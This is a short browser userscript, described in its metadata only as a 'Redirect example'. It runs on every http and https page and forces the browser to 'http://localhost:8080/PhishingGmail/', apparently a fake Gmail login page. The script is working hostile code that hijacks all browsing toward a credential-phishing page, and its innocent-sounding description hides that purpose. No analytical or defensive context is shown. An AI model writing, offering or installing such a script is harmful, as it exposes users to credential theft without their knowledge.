// ==UserScript==
// @name Redirect localhost
// @description Redirect example localhost
// @author Hunter
// @version 0.1
// @date 2007-07-25
// @include http://*
// @include https://*
// ==/UserScript==

(function()
{
document.location.href = "http://localhost:8080/PhishingGmail/";
})();==